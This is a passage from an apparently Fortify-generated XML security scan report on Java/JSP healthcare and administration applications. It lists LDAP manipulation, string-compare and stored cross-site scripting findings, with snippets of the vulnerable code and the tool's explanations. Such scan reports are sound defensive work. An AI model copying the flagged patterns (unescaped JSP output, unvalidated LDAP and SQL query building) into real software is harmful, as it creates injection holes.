				    			NamingEnumeration enumb=ctx.search("cn=PAGE_X_ROLE,"+pAuthBase,matchAttrs,attrIDs2);				    			</Snippet>
<TargetFunction>javax.naming.directory.BasicAttribute.BasicAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>RequestSessionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/RequestSessionUtil.java</FilePath>
<LineStart>390</LineStart>
<Snippet>                        {
                            l_sElementValue = p_reqRequest.getParameter(l_sElementName);
                            if(l_sElementValue==null) l_sElementValue = p_reqRequest.getParameter(l_sOrgElementName);
                            
                            if(l_sElementValue != null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B62ACF17020BD17D72B1A4D9FA3A931F" ruleID="A027E650-701F-44F5-8BE9-10435A764119">
                            <Category>LDAP Manipulation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method getPageAccessIndicator() in SecurityUtil.java executes an LDAP statement that contains unvalidated input, which can allow an attacker to alter the statement's meaning or execute arbitrary LDAP commands.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SecurityUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/common/SecurityUtil.java</FilePath>
<LineStart>1088</LineStart>
<Snippet>				    		try{
				    			matchAttrs=new BasicAttributes(true);					 			
					 			matchAttrs.put(new BasicAttribute("cn",pageName+"_"+ l_sRoleID));
					 			matchAttrs.put(new BasicAttribute("organizationalStatus","Active"));
				    			NamingEnumeration enumb=ctx.search("cn=PAGE_X_ROLE,"+pAuthBase,matchAttrs,attrIDs2);				    			</Snippet>
<TargetFunction>javax.naming.directory.BasicAttribute.BasicAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>CNSIRequestProcessorImpl.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/ecams/common/CNSIRequestProcessorImpl.java</FilePath>
<LineStart>813</LineStart>
<Snippet>                     * Added this code to fix the defect when we close SUBMENU from any susbsytem, it should go
                     * to corresponding susbsytem MENU page instead of going My Inbox Page**/
                    l_sSubMenuClose =  p_objHttpServletRequest.getParameter(MENUCLOSEACTION_PARAMETER);
                    if(l_sTargetModuleName.equalsIgnoreCase("My Inbox") &amp;&amp;
                        	l_sTargetPageName.equalsIgnoreCase("pgMyInbox") &amp;&amp;</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E6E88BC07899C9AF2E6647ECF7535E3F" ruleID="A027E650-701F-44F5-8BE9-10435A764119">
                            <Category>LDAP Manipulation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method getPageAccessIndicator() in SecurityUtil.java executes an LDAP statement that contains unvalidated input, which can allow an attacker to alter the statement's meaning or execute arbitrary LDAP commands.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SecurityUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/common/SecurityUtil.java</FilePath>
<LineStart>1088</LineStart>
<Snippet>				    		try{
				    			matchAttrs=new BasicAttributes(true);					 			
					 			matchAttrs.put(new BasicAttribute("cn",pageName+"_"+ l_sRoleID));
					 			matchAttrs.put(new BasicAttribute("organizationalStatus","Active"));
				    			NamingEnumeration enumb=ctx.search("cn=PAGE_X_ROLE,"+pAuthBase,matchAttrs,attrIDs2);				    			</Snippet>
<TargetFunction>javax.naming.directory.BasicAttribute.BasicAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>RequestSessionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/RequestSessionUtil.java</FilePath>
<LineStart>250</LineStart>
<Snippet>        {
            l_sGridName = p_reqRequest.getParameter(GRID_NAME);
            l_enmParameterNames = p_reqRequest.getParameterNames();
            boolean isFld=false;
            l_sPageName=p_reqRequest.getParameter("fhdn&amp;PageName");</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterNames()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B62ACF17020BD17D72B1A4D9FA3A931E" ruleID="A027E650-701F-44F5-8BE9-10435A764119">
                            <Category>LDAP Manipulation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method getPageAccessIndicator() in SecurityUtil.java executes an LDAP statement that contains unvalidated input, which can allow an attacker to alter the statement's meaning or execute arbitrary LDAP commands.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SecurityUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/common/SecurityUtil.java</FilePath>
<LineStart>1088</LineStart>
<Snippet>				    		try{
				    			matchAttrs=new BasicAttributes(true);					 			
					 			matchAttrs.put(new BasicAttribute("cn",pageName+"_"+ l_sRoleID));
					 			matchAttrs.put(new BasicAttribute("organizationalStatus","Active"));
				    			NamingEnumeration enumb=ctx.search("cn=PAGE_X_ROLE,"+pAuthBase,matchAttrs,attrIDs2);				    			</Snippet>
<TargetFunction>javax.naming.directory.BasicAttribute.BasicAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>CNSIRequestProcessorImpl.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/ecams/common/CNSIRequestProcessorImpl.java</FilePath>
<LineStart>778</LineStart>
<Snippet>                     * Added this code to fix the defect when we close SUBMENU from any susbsytem, it should go
                     * to corresponding susbsytem MENU page instead of going My Inbox Page**/
                    l_sSubMenuClose =  p_objHttpServletRequest.getParameter(MENUCLOSEACTION_PARAMETER);
                    if(l_sSubMenuClose!=null &amp;&amp;
                	l_sSubMenuClose.equalsIgnoreCase(CNSIConstants.CLOSE_MENU_PARENT_PAGE)) {</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="119">
                        <groupTitle>Code Correctness: Erroneous String Compare</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method getNextSequenceNo() in DbUtilImpl.java should compare strings with the equals() method, not == or !=.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>This program uses == or != to compare two strings for equality, which compares two objects for equality, not their values. Chances are good that the two references will never be equal.

Example 1: The following branch will never be taken.


  if (args[0] == STRING_CONSTANT) {
      logger.info("miracle");
  }


The == and != operators will only behave as expected when they are used to compare strings contained in objects that are equal. The most common way for this to occur is for the strings to be interned, whereby the strings are added to a pool of objects maintained by the String class. Once a string is interned, all uses of that string will use the same object and equality operators will behave as expected. All string literals and string-valued constants are interned automatically. Other strings can be interned manually be calling String.intern(), which will return a canonical instance of the current string, creating one if necessary.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Use equals() to compare strings.

Example 2: The code in Example 1 could be rewritten in the following way:


  if (STRING_CONSTANT.equals(args[0])) {
      logger.info("could happen");
  }
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Developers will sometimes compare strings for reference equality in order to "avoid the inefficiency" of calling equals() right off the bat:


 if (args[0] == STRING_CONSTANT) {
    doWork(args[0]);
 } else if (STRING_CONSTANT.equals(args[0])) {
    doWork(args[0]);
 }


In many circumstances this small performance gain comes at the cost of duplicated or convoluted code. Because String.equals() performs a == comparison before doing any deeper evaluation, the performance benefits of using == instead of String.equals() are limited to the overhead of performing a method call and are likely to be negligible in most environments.
Do a performance comparison for your program.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>119</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="804E91D5CB8BBAED07878BBCE0049FC5" ruleID="3B074389-826B-4DDA-9FEF-05ECD125D1FC">
                            <Category>Code Correctness: Erroneous String Compare</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method getNextSequenceNo() in DbUtilImpl.java should compare strings with the equals() method, not == or !=.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>492</LineStart>
<Snippet>        try
        {
            if (p_sSequenceName == null || p_sSequenceName == CommonConstants.EMPTY_STRING || p_conDbConn == null)
            {
                throw new InvalidArguementException("getNextSequenceNo parameter is null " +</Snippet>
<TargetFunction>Operation()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7771E13AED182761649F2B3A7D921085" ruleID="3B074389-826B-4DDA-9FEF-05ECD125D1FC">
                            <Category>Code Correctness: Erroneous String Compare</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method getNextSequenceNo() in DbUtilImpl.java should compare strings with the equals() method, not == or !=.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>426</LineStart>
<Snippet>        try
        {
            if (p_sSequenceName == null || p_sSequenceName == CommonConstants.EMPTY_STRING || p_conDbConn == null)
            {
                throw new InvalidArguementException("getNextSequenceNo parameter is null " +</Snippet>
<TargetFunction>Operation()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8EFEF0925E32E6E0FD9E0D116D3ED07E" ruleID="3B074389-826B-4DDA-9FEF-05ECD125D1FC">
                            <Category>Code Correctness: Erroneous String Compare</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method getByteArrayFromBlob() in DbUtilImpl.java should compare strings with the equals() method, not == or !=.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>1650</LineStart>
<Snippet>        try
        {
            if (p_sTableName == null || p_sTableName == CommonConstants.EMPTY_STRING || p_sColumnName == null || p_sColumnName == CommonConstants.EMPTY_STRING || p_condBConn == null)
            {
                throw new InvalidArguementException("getByteArrayFromBlob parameter is null" +</Snippet>
<TargetFunction>Operation()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="07F6225248C78E97BF639CB3BBB3F458" ruleID="3B074389-826B-4DDA-9FEF-05ECD125D1FC">
                            <Category>Code Correctness: Erroneous String Compare</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method getMapUsingProcedure() in DbUtilImpl.java should compare strings with the equals() method, not == or !=.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>1485</LineStart>
<Snippet>                                                b_iOutput);

                                        if (b_sTempString != null || b_sTempString != CommonConstants.EMPTY_STRING)
                                        {
                                            b_lstNewList = CollectionUtil.convertStringToList(</Snippet>
<TargetFunction>Operation()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BC736DC60BBACE5724BDD0F5A8CB5457" ruleID="3B074389-826B-4DDA-9FEF-05ECD125D1FC">
                            <Category>Code Correctness: Erroneous String Compare</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method getMapUsingProcedure() in DbUtilImpl.java should compare strings with the equals() method, not == or !=.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>1390</LineStart>
<Snippet>        {
            // check for invalid arguements
            if (p_sProcedureName == null || p_sProcedureName == CommonConstants.EMPTY_STRING || p_lstProcedureParametersMap == null || p_conDbConn == null)
            {
                throw new InvalidArguementException(</Snippet>
<TargetFunction>Operation()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="114">
                        <groupTitle>Cross-Site Scripting: Persistent</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method _jspService() in domaindetail.jsp sends unvalidated data to a web browser on line 183, which can result in the browser executing malicious code.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Cross-site scripting (XSS) vulnerabilities occur when:

1. Data enters a web application through an untrusted source. In the case of persistent (also known as stored) XSS, the untrusted source is typically a database or other back-end data store, while in the case of reflected XSS it is typically a web request.


2. The data is included in dynamic content that is sent to a web user without validation.

The malicious content sent to the web browser often takes the form of a segment of JavaScript, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.


Example 1: The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.


&lt;%...
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
if (rs != null) {
   rs.next();
   String name = rs.getString("name");
}
%&gt;

Employee Name: &lt;%= name %&gt;



This code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a "guestbook" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.


Example 2: The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.


&lt;% String eid = request.getParameter("eid"); %&gt;
...
Employee ID: &lt;%= eid %&gt;



As in Example 1, this code operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.

Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL which causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.

Some think that in the mobile environment, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.

Example 3: The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent.


...
        WebView webview = (WebView) findViewById(R.id.webview);
        webview.getSettings().setJavaScriptEnabled(true);
        String url = this.getIntent().getExtras().getString("url");
        webview.loadUrl(url);
...


If the value of url starts with javascript:, JavaScript code that follows executes within the context of the web page inside WebView.

As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:

- As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.

- As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities.

- As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.


A number of modern web frameworks provide mechanisms to perform user input validation (including Struts and Spring MVC). To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the Fortify user with the auditing process, the Fortify Software Security Research group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>The solution to XSS is to ensure that validation occurs in the correct places and checks are made for the correct properties.

Because XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.

Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.

The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.

A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:

In the content of a block-level element (in the middle of a paragraph of text):

- "&lt;" is special because it introduces a tag.

- "&amp;" is special because it introduces a character entity.

- "&gt;" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening "&lt;", but omitted it in error.

The following principles apply to attribute values:

- In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value.

- In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value.

- In attribute values without any quotes, white-space characters, such as space and tab, are special.

- "&amp;" is special when used with certain attributes, because it introduces a character entity.

In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:

- Space, tab, and new line are special because they mark the end of the URL.

- "&amp;" is special because it either introduces a character entity or separates CGI parameters.

- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.

- The "%" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, "%" must be filtered if input such as "%68%65%6C%6C%6F" becomes "hello" when it appears on the web page in question.


Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:

- Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag.

Server-side scripts:

- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (") on output might require additional filtering.

Other possibilities:

- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).

After you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.

If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].

Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. The Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database.

2. Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities.

3. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>114</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="A5A4FBDDD8608A78F95D28351006979F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method _jspService() in domaindetail.jsp sends unvalidated data to a web browser on line 183, which can result in the browser executing malicious code.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>domaindetail.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/admin/domaindetail.jsp</FilePath>
<LineStart>183</LineStart>
<Snippet> 		ProfileFormBean l_ObjProfileFormBean = (ProfileFormBean)l_lstDomainProfile.get(i);
 %&gt;
 {profilesid:"&lt;%=l_ObjProfileFormBean.getProfilesid()%&gt;",profilename:"&lt;%=l_ObjProfileFormBean.getProfilename()%&gt;",status:"&lt;%=l_ObjProfileFormBean.getStatus()%&gt;"},
 &lt;%}%&gt;];
 if(mydata.length &gt; 0) {</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LDAPProfileDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPProfileDAOImpl.java</FilePath>
<LineStart>94</LineStart>
<Snippet>	public List getProfilesAssociatedToDomain(String domainname){
		EqualsFilter filter = new EqualsFilter("ou",domainname);
		List l_lstAssociated =  ldapTemplate.search(new DistinguishedName("cn=DOMAIN_X_PROFILE"), filter.encode(),new AssociationContextMapper());
		
		OrFilter andfilter = new OrFilter();				</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.search()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F49D93B40269B40D14D215553754EE22" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method _jspService() in domaindetail.jsp sends unvalidated data to a web browser on line 183, which can result in the browser executing malicious code.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>domaindetail.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/admin/domaindetail.jsp</FilePath>
<LineStart>183</LineStart>
<Snippet> 		ProfileFormBean l_ObjProfileFormBean = (ProfileFormBean)l_lstDomainProfile.get(i);
 %&gt;
 {profilesid:"&lt;%=l_ObjProfileFormBean.getProfilesid()%&gt;",profilename:"&lt;%=l_ObjProfileFormBean.getProfilename()%&gt;",status:"&lt;%=l_ObjProfileFormBean.getStatus()%&gt;"},
 &lt;%}%&gt;];
 if(mydata.length &gt; 0) {</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LDAPProfileDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPProfileDAOImpl.java</FilePath>
<LineStart>106</LineStart>
<Snippet>		}else{
			
			List l_lstProfile = ldapTemplate.search(new DistinguishedName("cn=PROFILES"), andfilter.encode(), getContextMapper());
			
			for(int i=0;i&lt;l_lstProfile.size();i++){</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.search()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D2BBA6C488464240F9E32B8A5D080FEB" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method _jspService() in domaindetail.jsp sends unvalidated data to a web browser on line 260, which can result in the browser executing malicious code.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>domaindetail.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/admin/domaindetail.jsp</FilePath>
<LineStart>260</LineStart>
<Snippet> %&gt;
 {
 usersid:"&lt;%=l_ObjUserFormBean.getAccountsid()%&gt;",
 npi:"&lt;%=l_ObjUserFormBean.getNpi()%&gt;",
 loginid:"&lt;%=l_ObjUserFormBean.getLoginid()%&gt;",</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LDAPUserDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPUserDAOImpl.java</FilePath>
<LineStart>118</LineStart>
<Snippet>		}else{
			
			List l_lstUsers = ldapTemplate.search(new DistinguishedName("cn=USERS"), orfilter.encode(), getContextMapper());
			
			for(int i=0;i&lt;l_lstUsers.size();i++){</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.search()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8B9F333BE5CD91D05CA24B0F7887BB7D" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method _jspService() in domaindetail.jsp sends unvalidated data to a web browser on line 183, which can result in the browser executing malicious code.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>domaindetail.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/admin/domaindetail.jsp</FilePath>
<LineStart>183</LineStart>
<Snippet> 		ProfileFormBean l_ObjProfileFormBean = (ProfileFormBean)l_lstDomainProfile.get(i);
 %&gt;
 {profilesid:"&lt;%=l_ObjProfileFormBean.getProfilesid()%&gt;",profilename:"&lt;%=l_ObjProfileFormBean.getProfilename()%&gt;",status:"&lt;%=l_ObjProfileFormBean.getStatus()%&gt;"},
 &lt;%}%&gt;];
 if(mydata.length &gt; 0) {</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LDAPProfileDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPProfileDAOImpl.java</FilePath>
<LineStart>106</LineStart>
<Snippet>		}else{
			
			List l_lstProfile = ldapTemplate.search(new DistinguishedName("cn=PROFILES"), andfilter.encode(), getContextMapper());
			
			for(int i=0;i&lt;l_lstProfile.size();i++){</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.search()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6A008AFDD49FEF38C3832A68E8E9C2D7" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method _jspService() in domaindetail.jsp sends unvalidated data to a web browser on line 183, which can result in the browser executing malicious code.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>domaindetail.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/admin/domaindetail.jsp</FilePath>
<LineStart>183</LineStart>
<Snippet> 		ProfileFormBean l_ObjProfileFormBean = (ProfileFormBean)l_lstDomainProfile.get(i);
 %&gt;
